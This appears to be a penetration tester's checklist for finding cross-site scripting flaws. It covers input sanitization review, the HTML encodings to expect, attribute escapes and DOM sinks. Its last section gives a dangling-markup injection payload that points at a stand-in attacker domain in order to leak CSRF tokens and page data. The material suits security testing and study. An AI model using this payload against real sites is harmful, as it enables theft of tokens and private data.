# Cross-Site Scripting (XSS)

## Code Review Detection
Check for any user input or data input being written to HTML wihtout sanitization.

## Dynamic Testing Detection
Send unique strings to user inputs and see if any input is reflected back to any components on the web page.

### Encoding
Check encodings of the following characters being reflected in HTML
```
&
<
>
"
'
```

They should appear as
```
& -> &amp
< -> &lt;
> -> &gt;
" -> &#034; -> &quot;
' -> &#039; -> &apos;
```

If the characters are being reflected into other forms of data representation, check the specific characters that are applicable.

### Available Tags
Some applications allow certain HTML tags to be included in user input. Check if they lead to XSS using [Portswigger's XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### HTML Tag Attributes
If the user input is reflected in tag attributes and it is possible to escape the HTML attrbitue, this can lead to XSS by specifying malicious tag attributes.

### DOM-based XSS
Look for [DOM sinks](/attack_sinks/dom_xss_sinks.md).

### Dangling Markup Injection
Where XSS is not possible, try using payload like the following:
```
"><img src='//attacker-website.com?
```
The rest of the HTML page would be treated like a parameter and leaked to attacker controlled domain. This could be used to grab CSRF tokens, email messages, or sensitive data on the page.
